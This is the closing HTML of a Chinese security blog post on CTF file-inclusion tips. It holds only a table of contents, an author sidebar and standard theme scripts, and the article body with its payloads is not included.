href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">4.2.2.</span> <span class="toc-text"> 漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">4.2.3.</span> <span class="toc-text"> 漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php7-segment-fault"><span class="toc-number">4.3.</span> <span class="toc-text"> php7 Segment Fault</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6-2"><span class="toc-number">4.3.1.</span> <span class="toc-text"> 利用条件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-2"><span class="toc-number">4.3.2.</span> <span class="toc-text"> 漏洞分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#payload"><span class="toc-number">4.3.3.</span> <span class="toc-text"> Payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E7%8E%AF%E5%A2%83"><span class="toc-number">4.3.4.</span> <span class="toc-text"> 代码环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8-2"><span class="toc-number">4.3.5.</span> <span class="toc-text"> 漏洞利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6%E5%90%8Dexp"><span class="toc-number">4.3.6.</span> <span class="toc-text"> 爆破临时文件名exp</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#php7-%E8%80%81%E7%89%88%E6%9C%AC%E9%80%9A%E6%9D%80"><span class="toc-number">4.3.7.</span> <span class="toc-text"> php7 老版本通杀</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-session-%E4%B8%8A%E4%BC%A0%E8%BF%9B%E5%BA%A6"><span class="toc-number">5.</span> <span class="toc-text"> 利用 Session 上传进度</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "FuB0Y",
+          title: "文件包含小tip",
+          url: "http://example.com/2025/05/08/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%B0%8Ftip/",
+          excerpt: "",
+          description: "",
+          stripContent: "转载自ctf文件包含总结 - 杂谈小记 | Clear Mind = P1kap1 = 东隅已逝，桑榆非晚  Data伪协议 123456789101112data:,&amp;lt;文本数据&amp;gt;  data:text/plain,&amp;lt;文本数据&amp;gt;  data:text/html,&amp;lt;HTML代码&amp;gt;  data:text/html;base64,&amp;lt;base64编码的HTML代码&amp;gt;  data:text/css,&amp;lt;CSS代码&amp;gt;  data:text/css;b",
+          date: "Thu May 08 2025 15:26:17 GMT+0800",
+          updated: "Sun Mar 22 2026 14:25:27 GMT+0800",
+          cover: "/../images/1737907114de8a.jpg",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+
+
+
+  </body>
+  </html>
+
